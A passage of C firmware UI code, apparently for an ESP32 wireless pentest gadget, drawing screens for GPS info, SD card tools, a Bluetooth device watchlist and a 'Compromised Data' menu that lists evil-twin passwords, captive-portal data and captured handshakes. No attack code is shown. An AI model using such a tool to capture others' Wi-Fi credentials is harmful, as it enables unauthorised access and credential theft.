    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);

    create_tile(tiles, LV_SYMBOL_OK,      "Validate &\nProvision", COLOR_MATERIAL_TEAL,
                sd_card_tile_event_cb, "Validate");
    create_tile(tiles, LV_SYMBOL_DRIVE,   "Free\nSpace",            COLOR_TILE_BLUE,
                sd_card_tile_event_cb, "Free Space");
    create_tile(tiles, LV_SYMBOL_LIST,    "File\nTree",             COLOR_MATERIAL_ORANGE,
                sd_card_tile_event_cb, "Tree");
    create_tile(tiles, LV_SYMBOL_WARNING, "Format\nSD Card",        COLOR_MATERIAL_RED,
                sd_card_tile_event_cb, "Format");
}

// ============================================================================
// GPS Info screen
// ============================================================================

static lv_timer_t *gps_info_refresh_timer = NULL;
static lv_obj_t   *gps_info_fix_lbl  = NULL;
static lv_obj_t   *gps_info_time_lbl = NULL;
static lv_obj_t   *gps_info_sat_lbl  = NULL;
static lv_obj_t   *gps_info_lat_lbl  = NULL;
static lv_obj_t   *gps_info_lon_lbl  = NULL;
static lv_obj_t   *gps_info_alt_lbl  = NULL;
static lv_obj_t   *gps_info_acc_lbl  = NULL;

static void gps_info_refresh_cb(lv_timer_t *t)
{
    (void)t;
    if (!gps_info_fix_lbl || !lv_obj_is_valid(gps_info_fix_lbl)) return;

    char buf[64];

    if (current_gps.valid) {
        lv_label_set_text(gps_info_fix_lbl, LV_SYMBOL_GPS " Fix: YES");
        lv_obj_set_style_text_color(gps_info_fix_lbl, COLOR_MATERIAL_GREEN, 0);
    } else {
        lv_label_set_text(gps_info_fix_lbl, LV_SYMBOL_GPS " Fix: NO");
        lv_obj_set_style_text_color(gps_info_fix_lbl, COLOR_MATERIAL_ORANGE, 0);
    }

    if (current_gps.time_utc[0] != '\0')
        snprintf(buf, sizeof(buf), "UTC:  %s", current_gps.time_utc);
    else
        snprintf(buf, sizeof(buf), "UTC:  --");
    lv_label_set_text(gps_info_time_lbl, buf);

    snprintf(buf, sizeof(buf), "Satellites: %d", current_gps.satellites);
    lv_label_set_text(gps_info_sat_lbl, buf);

    if (current_gps.valid)
        snprintf(buf, sizeof(buf), "Lat:  %.6f", (double)current_gps.latitude);
    else
        snprintf(buf, sizeof(buf), "Lat:  --");
    lv_label_set_text(gps_info_lat_lbl, buf);

    if (current_gps.valid)
        snprintf(buf, sizeof(buf), "Lon:  %.6f", (double)current_gps.longitude);
    else
        snprintf(buf, sizeof(buf), "Lon:  --");
    lv_label_set_text(gps_info_lon_lbl, buf);

    if (current_gps.valid)
        snprintf(buf, sizeof(buf), "Alt:  %.1f m", (double)current_gps.altitude);
    else
        snprintf(buf, sizeof(buf), "Alt:  --");
    lv_label_set_text(gps_info_alt_lbl, buf);

    if (current_gps.valid)
        snprintf(buf, sizeof(buf), "Accuracy: %.1f m", (double)current_gps.accuracy);
    else
        snprintf(buf, sizeof(buf), "Accuracy: --");
    lv_label_set_text(gps_info_acc_lbl, buf);
}

static void gps_back_to_settings_cb(lv_event_t *e)
{
    (void)e;
    if (gps_info_refresh_timer) {
        lv_timer_del(gps_info_refresh_timer);
        gps_info_refresh_timer = NULL;
    }
    gps_info_fix_lbl = gps_info_time_lbl = gps_info_sat_lbl = NULL;
    gps_info_lat_lbl = gps_info_lon_lbl  = gps_info_alt_lbl = NULL;
    gps_info_acc_lbl = NULL;
    show_settings_screen();
}

static void show_gps_info_screen(void)
{
    create_function_page_base("GPS Info");

    lv_obj_t *card = lv_obj_create(function_page);
    lv_obj_set_size(card, 220, 252);
    lv_obj_align(card, LV_ALIGN_TOP_MID, 0, 30);
    lv_obj_set_style_bg_color(card, ui_panel_color(), 0);
    lv_obj_set_style_border_width(card, 1, 0);
    lv_obj_set_style_border_color(card, ui_border_color(), 0);
    lv_obj_set_style_radius(card, 10, 0);
    lv_obj_set_style_pad_all(card, 10, 0);
    lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);

    int y = 0;

    gps_info_fix_lbl = lv_label_create(card);
    lv_obj_set_style_text_font(gps_info_fix_lbl, &lv_font_montserrat_16, 0);
    lv_obj_align(gps_info_fix_lbl, LV_ALIGN_TOP_LEFT, 0, y);
    y += 26;

    gps_info_time_lbl = lv_label_create(card);
    lv_obj_set_style_text_font(gps_info_time_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(gps_info_time_lbl, ui_text_color(), 0);
    lv_obj_align(gps_info_time_lbl, LV_ALIGN_TOP_LEFT, 0, y);
    y += 22;

    gps_info_sat_lbl = lv_label_create(card);
    lv_obj_set_style_text_font(gps_info_sat_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(gps_info_sat_lbl, ui_text_color(), 0);
    lv_obj_align(gps_info_sat_lbl, LV_ALIGN_TOP_LEFT, 0, y);
    y += 22;

    gps_info_lat_lbl = lv_label_create(card);
    lv_obj_set_style_text_font(gps_info_lat_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(gps_info_lat_lbl, ui_text_color(), 0);
    lv_obj_align(gps_info_lat_lbl, LV_ALIGN_TOP_LEFT, 0, y);
    y += 22;

    gps_info_lon_lbl = lv_label_create(card);
    lv_obj_set_style_text_font(gps_info_lon_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(gps_info_lon_lbl, ui_text_color(), 0);
    lv_obj_align(gps_info_lon_lbl, LV_ALIGN_TOP_LEFT, 0, y);
    y += 22;

    gps_info_alt_lbl = lv_label_create(card);
    lv_obj_set_style_text_font(gps_info_alt_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(gps_info_alt_lbl, ui_text_color(), 0);
    lv_obj_align(gps_info_alt_lbl, LV_ALIGN_TOP_LEFT, 0, y);
    y += 22;

    gps_info_acc_lbl = lv_label_create(card);
    lv_obj_set_style_text_font(gps_info_acc_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(gps_info_acc_lbl, ui_text_color(), 0);
    lv_obj_align(gps_info_acc_lbl, LV_ALIGN_TOP_LEFT, 0, y);
    y += 28;

    // Divider
    lv_obj_t *div = lv_obj_create(card);
    lv_obj_set_size(div, 190, 1);
    lv_obj_align(div, LV_ALIGN_TOP_LEFT, 0, y);
    lv_obj_set_style_bg_color(div, ui_border_color(), 0);
    lv_obj_set_style_border_width(div, 0, 0);
    lv_obj_clear_flag(div, LV_OBJ_FLAG_SCROLLABLE);
    y += 8;

    // UART config (static — hardware reference)
    lv_obj_t *uart_lbl = lv_label_create(card);
    lv_label_set_text(uart_lbl, "UART1  IO4=RX  IO5=TX\n9600 baud  ATGM336");
    lv_obj_set_style_text_font(uart_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(uart_lbl, ui_muted_color(), 0);
    lv_obj_align(uart_lbl, LV_ALIGN_TOP_LEFT, 0, y);

    // Populate immediately then start 1 s refresh timer
    gps_info_refresh_cb(NULL);
    gps_info_refresh_timer = lv_timer_create(gps_info_refresh_cb, 1000, NULL);

    lv_obj_t *back_btn = lv_btn_create(function_page);
    lv_obj_set_size(back_btn, 90, 34);
    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(back_btn, COLOR_MATERIAL_TEAL, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(back_btn, lv_color_lighten(COLOR_MATERIAL_TEAL, 30), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(back_btn, 0, 0);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, gps_back_to_settings_cb, LV_EVENT_CLICKED, NULL);
    lv_obj_t *back_lbl2 = lv_label_create(back_btn);
    lv_label_set_text(back_lbl2, "Back");
    lv_obj_set_style_text_color(back_lbl2, ui_text_color(), 0);
    lv_obj_center(back_lbl2);
}

// ============================================================================
// WiFi Monitor screen
// ============================================================================

static void show_wifi_monitor_screen(void)
{
    create_function_page_base("Compromised Data");
    
    lv_obj_t *tiles = lv_obj_create(function_page);
    lv_obj_set_size(tiles, lv_pct(100), LCD_V_RES - 30);
    lv_obj_align(tiles, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(tiles, ui_bg_color(), 0);
    lv_obj_set_style_border_width(tiles, 0, 0);
    lv_obj_set_style_pad_all(tiles, 10, 0);
    lv_obj_set_style_pad_gap(tiles, 10, 0);
    lv_obj_set_flex_flow(tiles, LV_FLEX_FLOW_ROW_WRAP);
    lv_obj_set_flex_align(tiles, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    
    // Evil Twin Passwords - Blue
    create_tile(tiles, LV_SYMBOL_EYE_OPEN, "Evil Twin\nPasswords", COLOR_TILE_BLUE, wifi_monitor_tile_event_cb, "Evil Twin Passwords");
    
    // Portal Data - Purple
    create_tile(tiles, LV_SYMBOL_LIST, "Portal\nData", COLOR_MATERIAL_PURPLE, wifi_monitor_tile_event_cb, "Portal Data");
    
    // Handshakes - Amber/Orange
    create_tile(tiles, LV_SYMBOL_DOWNLOAD, "Handshakes", COLOR_MATERIAL_AMBER, wifi_monitor_tile_event_cb, "Handshakes");
}

// ── BT Lookout ────────────────────────────────────────────────────────────────

static void lookout_popup_dismiss_cb(lv_event_t *e)
{
    (void)e;
    if (bt_lookout_popup_tmr) {
        lv_timer_del(bt_lookout_popup_tmr);
        bt_lookout_popup_tmr = NULL;
    }
    if (bt_lookout_popup_obj && lv_obj_is_valid(bt_lookout_popup_obj)) {
        lv_obj_del(bt_lookout_popup_obj);
        bt_lookout_popup_obj = NULL;
    }
}

static void lookout_popup_auto_dismiss_cb(lv_timer_t *t)
{
    (void)t;
    bt_lookout_popup_tmr = NULL;
    if (bt_lookout_popup_obj && lv_obj_is_valid(bt_lookout_popup_obj)) {
        lv_obj_del(bt_lookout_popup_obj);
        bt_lookout_popup_obj = NULL;
    }
}

static void show_lookout_alert_popup(const char *name, const char *mac_str, int rssi)
{
    if (bt_lookout_popup_obj && lv_obj_is_valid(bt_lookout_popup_obj)) {
        lv_obj_del(bt_lookout_popup_obj);
        bt_lookout_popup_obj = NULL;
    }
    if (bt_lookout_popup_tmr) {
        lv_timer_del(bt_lookout_popup_tmr);
        bt_lookout_popup_tmr = NULL;
    }

    lv_obj_t *overlay = lv_obj_create(lv_layer_top());
    lv_obj_set_size(overlay, LCD_H_RES, LCD_V_RES);
    lv_obj_set_style_bg_color(overlay, lv_color_make(0, 0, 0), 0);
    lv_obj_set_style_bg_opa(overlay, LV_OPA_60, 0);
    lv_obj_set_style_border_width(overlay, 0, 0);
    lv_obj_clear_flag(overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_set_style_pad_all(overlay, 0, 0);
    bt_lookout_popup_obj = overlay;

    lv_obj_t *card = lv_obj_create(overlay);
    lv_obj_set_size(card, 220, 175);
    lv_obj_center(card);
    lv_obj_set_style_bg_color(card, lv_color_make(30, 30, 30), 0);
    lv_obj_set_style_border_color(card, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_border_width(card, 2, 0);
    lv_obj_set_style_radius(card, 12, 0);
    lv_obj_set_style_pad_all(card, 10, 0);
    lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);

    lv_obj_t *title = lv_label_create(card);
    lv_label_set_text(title, LV_SYMBOL_WARNING " Dee Dee Detected!");
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_14, 0);
    lv_obj_align(title, LV_ALIGN_TOP_MID, 0, 0);

    lv_obj_t *name_lbl = lv_label_create(card);
    lv_label_set_text(name_lbl, name ? name : "Unknown");
    lv_label_set_long_mode(name_lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
    lv_obj_set_width(name_lbl, 200);
    lv_obj_set_style_text_color(name_lbl, lv_color_white(), 0);
    lv_obj_set_style_text_font(name_lbl, &lv_font_montserrat_16, 0);
    lv_obj_align(name_lbl, LV_ALIGN_TOP_MID, 0, 22);

    lv_obj_t *mac_lbl = lv_label_create(card);
    lv_label_set_text(mac_lbl, mac_str ? mac_str : "");
    lv_obj_set_style_text_color(mac_lbl, lv_color_make(176, 176, 176), 0);
    lv_obj_set_style_text_font(mac_lbl, &lv_font_montserrat_12, 0);
    lv_obj_align(mac_lbl, LV_ALIGN_TOP_MID, 0, 44);

    /* Vendor lookup: mac_str is NimBLE LE order; raw[5..3] = OUI standard notation */
    int next_y = 60;
    if (oui_lookup_is_loaded() && mac_str && strlen(mac_str) == 17) {
        uint8_t raw[6];
        if (sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &raw[0], &raw[1], &raw[2], &raw[3], &raw[4], &raw[5]) == 6) {
            uint8_t oui[3] = {raw[5], raw[4], raw[3]};
            const char *vendor = oui_lookup(oui);
            if (vendor && vendor[0]) {
                lv_obj_t *vend_lbl = lv_label_create(card);
                char vend_buf[32];
                snprintf(vend_buf, sizeof(vend_buf), "%s", vendor);
                lv_label_set_text(vend_lbl, vend_buf);
                lv_label_set_long_mode(vend_lbl, LV_LABEL_LONG_DOT);
                lv_obj_set_width(vend_lbl, 200);
                lv_obj_set_style_text_color(vend_lbl, lv_color_make(150, 150, 255), 0);
                lv_obj_set_style_text_font(vend_lbl, &lv_font_montserrat_12, 0);
                lv_obj_align(vend_lbl, LV_ALIGN_TOP_MID, 0, next_y);
                next_y += 16;
            }
        }
    }

    if (rssi != 0) {
        lv_obj_t *rssi_lbl = lv_label_create(card);
        char rssi_buf[24];
        snprintf(rssi_buf, sizeof(rssi_buf), "RSSI: %d dBm", rssi);
        lv_label_set_text(rssi_lbl, rssi_buf);
        lv_obj_set_style_text_color(rssi_lbl, lv_color_make(100, 220, 100), 0);
        lv_obj_set_style_text_font(rssi_lbl, &lv_font_montserrat_12, 0);
        lv_obj_align(rssi_lbl, LV_ALIGN_TOP_MID, 0, next_y);
        next_y += 16;
    }

    lv_obj_t *btn = lv_btn_create(card);
    lv_obj_set_size(btn, 100, 28);
    lv_obj_align(btn, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_obj_set_style_bg_color(btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(btn, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(btn, 0, 0);
    lv_obj_set_style_radius(btn, 6, 0);
    lv_obj_add_event_cb(btn, lookout_popup_dismiss_cb, LV_EVENT_CLICKED, NULL);

    lv_obj_t *btn_lbl = lv_label_create(btn);
    lv_label_set_text(btn_lbl, "Dismiss");
    lv_obj_set_style_text_font(btn_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(btn_lbl, lv_color_white(), 0);
    lv_obj_center(btn_lbl);

    bt_lookout_popup_tmr = lv_timer_create(lookout_popup_auto_dismiss_cb, 15000, NULL);
    lv_timer_set_repeat_count(bt_lookout_popup_tmr, 1);
}

static void bt_lookout_update_ui(void)
{
    if (!bt_lookout_ui_active) return;

    if (bt_lookout_status_lbl && lv_obj_is_valid(bt_lookout_status_lbl)) {
        bool active = bt_lookout_is_active();
        lv_label_set_text(bt_lookout_status_lbl, active ? "MONITORING" : "Stopped");
        lv_obj_set_style_text_color(bt_lookout_status_lbl,
            active ? COLOR_MATERIAL_GREEN : lv_color_make(176, 176, 176), 0);
    }

    if (bt_lookout_count_lbl && lv_obj_is_valid(bt_lookout_count_lbl)) {
        char buf[32];
        int cnt = bt_lookout_count();
        snprintf(buf, sizeof(buf), "Watching: %d device%s", cnt, cnt == 1 ? "" : "s");
        lv_label_set_text(bt_lookout_count_lbl, buf);
    }

    if (bt_lookout_start_btn && lv_obj_is_valid(bt_lookout_start_btn)) {
        bool active = bt_lookout_is_active();
        lv_obj_t *icon = lv_obj_get_child(bt_lookout_start_btn, 0);
        lv_obj_t *lbl  = lv_obj_get_child(bt_lookout_start_btn, 1);
        if (icon) lv_label_set_text(icon, active ? LV_SYMBOL_STOP : LV_SYMBOL_PLAY);
        if (lbl)  lv_label_set_text(lbl,  active ? "Stop" : "Start");
        lv_obj_set_style_bg_color(bt_lookout_start_btn,
            active ? COLOR_MATERIAL_RED : COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
    }

    if (bt_lookout_edit_btn && lv_obj_is_valid(bt_lookout_edit_btn)) {
        if (bt_lookout_is_active())
            lv_obj_add_flag(bt_lookout_edit_btn, LV_OBJ_FLAG_HIDDEN);
        else
            lv_obj_clear_flag(bt_lookout_edit_btn, LV_OBJ_FLAG_HIDDEN);
    }
    if (bt_lookout_oui_btn && lv_obj_is_valid(bt_lookout_oui_btn)) {
        if (bt_lookout_is_active())
            lv_obj_add_flag(bt_lookout_oui_btn, LV_OBJ_FLAG_HIDDEN);
        else
            lv_obj_clear_flag(bt_lookout_oui_btn, LV_OBJ_FLAG_HIDDEN);
    }
}

static void bt_lookout_scan_loop_task(void *pv)
{
    (void)pv;
    while (bt_lookout_is_active()) {
        bt_reset_counters();
        int rc = bt_start_scan();
        if (rc != 0) {
            ESP_LOGE(TAG, "BT Lookout: scan failed %d, retry 5s", rc);
            vTaskDelay(pdMS_TO_TICKS(5000));
            continue;
        }
        for (int i = 0; i < 200 && bt_lookout_is_active(); i++)
            vTaskDelay(pdMS_TO_TICKS(100));
        bt_stop_scan();
        if (bt_lookout_is_active())
            vTaskDelay(pdMS_TO_TICKS(300));
    }
    bt_lookout_scan_loop_handle = NULL;
    vTaskDelete(NULL);
}

static void lookout_start_btn_cb(lv_event_t *e)
{
    (void)e;
    if (bt_lookout_is_active()) {
        bt_lookout_stop();
    } else {
        bt_lookout_start();
        if (bt_lookout_scan_loop_handle == NULL) {
            xTaskCreate(bt_lookout_scan_loop_task, "btlookout_scan", 4096, NULL, 3,
                        &bt_lookout_scan_loop_handle);
        }
    }
    bt_lookout_update_ui();
}

static void lookout_dark_btn_cb(lv_event_t *e)
{
    (void)e;
    go_dark_enable();
}

static void lookout_back_btn_cb(lv_event_t *e)
{
    (void)e;
    bt_lookout_ui_active  = false;
    bt_lookout_status_lbl = NULL;
    bt_lookout_count_lbl  = NULL;
    bt_lookout_last_lbl   = NULL;
    bt_lookout_start_btn  = NULL;
    bt_lookout_edit_btn   = NULL;
    bt_lookout_oui_btn    = NULL;
    if (!bt_lookout_is_active() && current_radio_mode == RADIO_MODE_BLE) {
        bt_nimble_deinit();
        current_radio_mode = RADIO_MODE_NONE;
    }
    show_bluetooth_screen();
}

static void show_bt_lookout_screen(void)
{
    if (function_page) { lv_obj_del(function_page); function_page = NULL; }
    reset_function_page_children();

    create_function_page_base("Bluetooth Lookout");
    bt_lookout_ui_active  = true;
    bt_lookout_status_lbl = NULL;
    bt_lookout_count_lbl  = NULL;
    bt_lookout_last_lbl   = NULL;
    bt_lookout_start_btn  = NULL;
    bt_lookout_edit_btn   = NULL;
    bt_lookout_oui_btn    = NULL;

    ensure_sd_mounted();
    if (!oui_lookup_is_loaded()) oui_lookup_init(OUI_DEFAULT_PATH);
    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
        bt_lookout_load(BT_LOOKOUT_CSV_PATH);
        xSemaphoreGive(sd_spi_mutex);
    }

    if (!ensure_ble_mode()) {
        lv_obj_t *err = lv_label_create(function_page);
        lv_label_set_text(err, "BLE init failed!");
        lv_obj_set_style_text_color(err, COLOR_MATERIAL_RED, 0);
        lv_obj_center(err);
        bt_lookout_ui_active = false;
        return;
    }

    // Status card
    lv_obj_t *card = lv_obj_create(function_page);
    lv_obj_set_size(card, 220, 105);
    lv_obj_align(card, LV_ALIGN_TOP_MID, 0, 38);
    lv_obj_set_style_bg_color(card, ui_card_color(), 0);
    lv_obj_set_style_border_color(card, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_border_width(card, 1, 0);
    lv_obj_set_style_radius(card, 8, 0);
    lv_obj_set_style_pad_all(card, 8, 0);
    lv_obj_clear_flag(card, LV_OBJ_FLAG_SCROLLABLE);

    bool is_active = bt_lookout_is_active();
    bt_lookout_status_lbl = lv_label_create(card);
    lv_label_set_text(bt_lookout_status_lbl, is_active ? "MONITORING" : "Stopped");
    lv_obj_set_style_text_color(bt_lookout_status_lbl,
        is_active ? COLOR_MATERIAL_GREEN : lv_color_make(176, 176, 176), 0);
    lv_obj_set_style_text_font(bt_lookout_status_lbl, &lv_font_montserrat_20, 0);
    lv_obj_align(bt_lookout_status_lbl, LV_ALIGN_TOP_MID, 0, 0);

    bt_lookout_count_lbl = lv_label_create(card);
    char cnt_buf[40];
    int n = bt_lookout_count();
    snprintf(cnt_buf, sizeof(cnt_buf), "Watching: %d device%s", n, n == 1 ? "" : "s");
    lv_label_set_text(bt_lookout_count_lbl, cnt_buf);
    lv_obj_set_style_text_color(bt_lookout_count_lbl, ui_text_color(), 0);
    lv_obj_set_style_text_font(bt_lookout_count_lbl, &lv_font_montserrat_14, 0);
    lv_obj_align(bt_lookout_count_lbl, LV_ALIGN_TOP_MID, 0, 30);

    bt_lookout_last_lbl = lv_label_create(card);
    lv_label_set_text(bt_lookout_last_lbl, "No detection yet");
    lv_label_set_long_mode(bt_lookout_last_lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
    lv_obj_set_width(bt_lookout_last_lbl, 200);
    lv_obj_set_style_text_color(bt_lookout_last_lbl, lv_color_make(176, 176, 176), 0);
    lv_obj_set_style_text_font(bt_lookout_last_lbl, &lv_font_montserrat_12, 0);
    lv_obj_align(bt_lookout_last_lbl, LV_ALIGN_TOP_MID, 0, 54);

    // Start/Stop button
    bt_lookout_start_btn = lv_btn_create(function_page);
    lv_obj_set_size(bt_lookout_start_btn, 110, 30);
    lv_obj_align(bt_lookout_start_btn, LV_ALIGN_TOP_MID, 0, 155);
    lv_obj_set_style_bg_color(bt_lookout_start_btn,
        is_active ? COLOR_MATERIAL_RED : COLOR_MATERIAL_GREEN, LV_STATE_DEFAULT);
    lv_obj_set_style_border_width(bt_lookout_start_btn, 0, 0);
    lv_obj_set_style_radius(bt_lookout_start_btn, 8, 0);
    lv_obj_set_flex_flow(bt_lookout_start_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(bt_lookout_start_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(bt_lookout_start_btn, 4, 0);

    lv_obj_t *s_icon = lv_label_create(bt_lookout_start_btn);
    lv_label_set_text(s_icon, is_active ? LV_SYMBOL_STOP : LV_SYMBOL_PLAY);
    lv_obj_set_style_text_font(s_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(s_icon, lv_color_white(), 0);

    lv_obj_t *s_lbl = lv_label_create(bt_lookout_start_btn);
    lv_label_set_text(s_lbl, is_active ? "Stop" : "Start");
    lv_obj_set_style_text_font(s_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(s_lbl, lv_color_white(), 0);

    lv_obj_add_event_cb(bt_lookout_start_btn, lookout_start_btn_cb, LV_EVENT_CLICKED, NULL);

    // Blackout button
    lv_obj_t *dark_btn = lv_btn_create(function_page);
    lv_obj_set_size(dark_btn, 110, 30);
    lv_obj_align(dark_btn, LV_ALIGN_TOP_MID, 0, 195);
    lv_obj_set_style_bg_color(dark_btn, lv_color_make(50, 50, 50), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(dark_btn, lv_color_make(80, 80, 80), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(dark_btn, 0, 0);
    lv_obj_set_style_radius(dark_btn, 8, 0);
    lv_obj_set_flex_flow(dark_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(dark_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(dark_btn, 4, 0);

    lv_obj_t *d_icon = lv_label_create(dark_btn);
    lv_label_set_text(d_icon, LV_SYMBOL_EYE_CLOSE);
    lv_obj_set_style_text_font(d_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(d_icon, lv_color_white(), 0);

    lv_obj_t *d_lbl = lv_label_create(dark_btn);
    lv_label_set_text(d_lbl, "Blackout");
    lv_obj_set_style_text_font(d_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(d_lbl, lv_color_white(), 0);

    lv_obj_add_event_cb(dark_btn, lookout_dark_btn_cb, LV_EVENT_CLICKED, NULL);

    // Edit Watchlist + OUI Groups buttons — side by side, only visible when stopped
    bt_lookout_edit_btn = lv_btn_create(function_page);
    lv_obj_set_size(bt_lookout_edit_btn, 106, 28);
    lv_obj_align(bt_lookout_edit_btn, LV_ALIGN_TOP_MID, -58, 235);
    lv_obj_set_style_bg_color(bt_lookout_edit_btn, lv_color_make(30, 80, 140), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(bt_lookout_edit_btn, lv_color_make(50, 110, 180), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(bt_lookout_edit_btn, 0, 0);
    lv_obj_set_style_radius(bt_lookout_edit_btn, 8, 0);
    lv_obj_set_flex_flow(bt_lookout_edit_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(bt_lookout_edit_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(bt_lookout_edit_btn, 4, 0);
    lv_obj_t *ed_icon = lv_label_create(bt_lookout_edit_btn);
    lv_label_set_text(ed_icon, LV_SYMBOL_EDIT);
    lv_obj_set_style_text_font(ed_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(ed_icon, lv_color_white(), 0);
    lv_obj_t *ed_lbl = lv_label_create(bt_lookout_edit_btn);
    lv_label_set_text(ed_lbl, "Edit List");
    lv_obj_set_style_text_font(ed_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(ed_lbl, lv_color_white(), 0);
    lv_obj_add_event_cb(bt_lookout_edit_btn, lookout_edit_btn_cb, LV_EVENT_CLICKED, NULL);
    if (is_active) lv_obj_add_flag(bt_lookout_edit_btn, LV_OBJ_FLAG_HIDDEN);

    bt_lookout_oui_btn = lv_btn_create(function_page);
    lv_obj_set_size(bt_lookout_oui_btn, 106, 28);
    lv_obj_align(bt_lookout_oui_btn, LV_ALIGN_TOP_MID, 58, 235);
    lv_obj_set_style_bg_color(bt_lookout_oui_btn, lv_color_make(70, 30, 120), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(bt_lookout_oui_btn, lv_color_make(100, 50, 160), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(bt_lookout_oui_btn, 0, 0);
    lv_obj_set_style_radius(bt_lookout_oui_btn, 8, 0);
    lv_obj_set_flex_flow(bt_lookout_oui_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(bt_lookout_oui_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(bt_lookout_oui_btn, 4, 0);
    lv_obj_t *og_icon = lv_label_create(bt_lookout_oui_btn);
    lv_label_set_text(og_icon, LV_SYMBOL_WIFI);
    lv_obj_set_style_text_font(og_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(og_icon, lv_color_white(), 0);
    lv_obj_t *og_lbl = lv_label_create(bt_lookout_oui_btn);
    lv_label_set_text(og_lbl, "OUI Groups");
    lv_obj_set_style_text_font(og_lbl, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(og_lbl, lv_color_white(), 0);
    lv_obj_add_event_cb(bt_lookout_oui_btn, lookout_oui_btn_cb, LV_EVENT_CLICKED, NULL);
    if (is_active) lv_obj_add_flag(bt_lookout_oui_btn, LV_OBJ_FLAG_HIDDEN);

    // Back button
    lv_obj_t *back_btn = lv_btn_create(function_page);
    lv_obj_set_size(back_btn, 110, 28);
    lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -10);
    lv_obj_set_style_bg_color(back_btn, lv_color_make(60, 60, 60), LV_STATE_DEFAULT);
    lv_obj_set_style_bg_color(back_btn, lv_color_make(90, 90, 90), LV_STATE_PRESSED);
    lv_obj_set_style_border_width(back_btn, 0, 0);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_set_flex_flow(back_btn, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(back_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(back_btn, 4, 0);

    lv_obj_t *b_icon = lv_label_create(back_btn);
    lv_label_set_text(b_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_font(b_icon, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(b_icon, ui_text_color(), 0);

    lv_obj_t *b_lbl = lv_label_create(back_btn);
    lv_label_set_text(b_lbl, "Back");
    lv_obj_set_style_text_font(b_lbl, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(b_lbl, ui_text_color(), 0);

    lv_obj_add_event_cb(back_btn, lookout_back_btn_cb, LV_EVENT_CLICKED, NULL);
}

/* ── Watchlist editor ─────────────────────────────────────────────── */

static bool s_editor_delete[BT_LOOKOUT_MAX_ENTRIES];
static int  s_editor_count  = 0;
static lv_obj_t *s_editor_rows[BT_LOOKOUT_MAX_ENTRIES];

static void lookout_oui_btn_cb(lv_event_t *e)
{
    (void)e;
